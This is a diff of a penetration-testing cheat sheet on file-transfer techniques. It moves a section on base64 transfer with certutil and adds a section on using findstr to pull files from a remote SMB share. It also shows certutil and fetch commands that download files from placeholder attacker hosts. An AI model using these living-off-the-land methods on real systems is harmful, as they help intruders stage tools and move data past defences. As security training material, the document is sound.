@@ -85,9 +85,31 @@ often packaged with the operating system distribution.
 On Windows machines, the process is usually not as straight forward but
 multiples methods can still be used. Transferring the `netcat` utility may
 simplify the subsequent files transfer.  
+
 The most reliable tools and methods are presented below. For a more exhaustive
 list of tools that can be used to transfer files on and off a Windows machine,
 refer to `https://lolbas-project.github.io/#/download`.
+
+###### [Linux / Windows] echo & base64 encoding
+
+The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
+`certutil` can be used to easily transfer files on Linux / Windows systems.   
+
+Encode the file to be transferred using base64 server-side, copy it to the
+clipboard buffer, and decode it into a file client-side.   
+
+```
+# Server-side (Linux)
+base64 -w 0 <FILE> | xclip -selection clipboard
+
+# Client-side - Linux
+echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>
+
+# Client-side - Windows
+echo <BASE64_FILECONTENT> > tmp_file_base64.txt
+certutil -decode tmp_file_base64.txt <OUTPUT_FILE>
+# del tmp_file_base64.txt
+```
 
 ###### [Linux] wget
 
@@ -120,27 +142,6 @@ The FreeBSD built-in `fetch` can be used to retrieve a file by URL:
 ```
 fetch <URL>
 fetch -o <OUTPUT_FILE> http://<IP>:<PORT>/<FILE>
-```
-
-###### [Linux / Windows] echo & base64 encoding
-
-The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
-`certutil` can be used to easily transfer files on Linux / Windows systems.   
-
-Encode the file to be transferred using base64 server-side, copy it to the
-clipboard buffer, and decode it into a file client-side.   
-
-```
-# Server-side (Linux)
-base64 -w 0 <FILE> | xclip -selection clipboard
-
-# Client-side - Linux
-echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>
-
-# Client-side - Windows
-echo <BASE64_FILECONTENT> > tmp_file_base64.txt
-certutil -decode tmp_file_base64.txt <OUTPUT_FILE>
-# del tmp_file_base64.txt
 ```
 
 ###### [Linux / Windows] Python
@@ -252,6 +253,17 @@ files from a remote URL.
 
 ```
 certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
+```
+
+###### [Windows] findstr
+
+`findstr` is a Windows utility used for searching patterns of text in files.
+
+The following command can be used to search the string DoNotExist123456789 in
+the specified remote file and, since it does not exist (/V), download it.
+
+```
+findstr /V /L DoNotExist123456789 \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> > <OUTPUT_FILE_PATH>
 ```
 
 ###### [Linux / Windows] FTP
